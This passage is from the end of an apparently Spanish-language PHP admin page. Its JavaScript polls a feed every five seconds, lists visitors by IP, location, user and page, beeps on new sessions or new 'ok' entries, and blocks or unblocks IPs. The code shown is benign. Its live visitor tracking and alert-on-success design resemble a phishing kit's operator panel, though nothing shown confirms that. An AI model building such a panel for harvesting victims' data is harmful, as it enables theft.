            if(r.cnt>1){var spc=document.createElement('span');spc.className='cnt';spc.textContent='x'+r.cnt;tr.lastChild.appendChild(spc);}
            td(r.loc);
            var c=document.createElement('td');var sp=document.createElement('span');
            sp.className='badge b-'+r.st;sp.textContent=r.lbl||r.st;c.appendChild(sp);tr.appendChild(c);
            td(r.e);td(r.ref,'trunc');
            tb.appendChild(tr);
          });
        }
        // En línea
        var ob=document.getElementById('onBody');
        if(ob){
          ob.innerHTML='';
          var onl=d.online||[];
          if(!onl.length){
            var tr9=document.createElement('tr');var c9=document.createElement('td');
            c9.colSpan=7;c9.style.color='#999';c9.textContent='Nadie conectado todavía';
            tr9.appendChild(c9);ob.appendChild(tr9);
          }
          onl.forEach(function(p){
            var tr=document.createElement('tr');
            var c=document.createElement('td');var sp=document.createElement('span');
            sp.className='dot '+p.st;c.appendChild(sp);tr.appendChild(c);
            function td(txt,cls){var x=document.createElement('td');if(cls)x.className=cls;x.textContent=txt;tr.appendChild(x);}
            td(p.ip,'url');
            if(p.cnt>1){var spt=document.createElement('span');spt.className='cnt';spt.textContent='x'+p.cnt;tr.lastChild.appendChild(spt);}
            td(p.loc);td(p.u);td(p.pg);td(haceTxt(p.age));
            var bc=document.createElement('td');var bb=document.createElement('button');
            bb.type='button';bb.className='blkbtn';bb.textContent=p.blk?'🔓':'🚫';
            bb.title=p.blk?'Desbloquear':'Bloquear 3h';bb.dataset.ip=p.ip;bb.dataset.blk=p.blk?'1':'';
            bc.appendChild(bb);tr.appendChild(bc);
            ob.appendChild(tr);
          });
        }
        // Sonido: nuevo sid en línea o nueva entrada 'ok'
        var hasNew=false;
        (d.online||[]).forEach(function(p){if(!seenSids[p.sid]){seenSids[p.sid]=1;if(!firstFeed)hasNew=true;}});
        if(d.newestOk&&d.newestOk!==lastOk){if(lastOk!==''&&!firstFeed)hasNew=true;lastOk=d.newestOk;}
        if(hasNew)beep();
        firstFeed=false;
      })
      .catch(function(){});
  };
  setInterval(feed,5000);feed();

  // Bloquear / desbloquear IP (delegado: cubre filas renderizadas y del feed)
  document.addEventListener('click',function(ev){
    var b=ev.target.closest?ev.target.closest('.blkbtn'):null;
    if(!b||!b.dataset.ip)return;
    var fd=new FormData();
    fd.append('act',b.dataset.blk?'unblock_ip':'block_ip');
    fd.append('csrf',csrf);fd.append('ip',b.dataset.ip);
    fetch('panel.php',{method:'POST',body:fd,credentials:'same-origin'})
      .then(function(){location.reload()})
      .catch(function(){location.reload()});
  });
})();
</script>
<?php endif; ?>
</body>
</html>
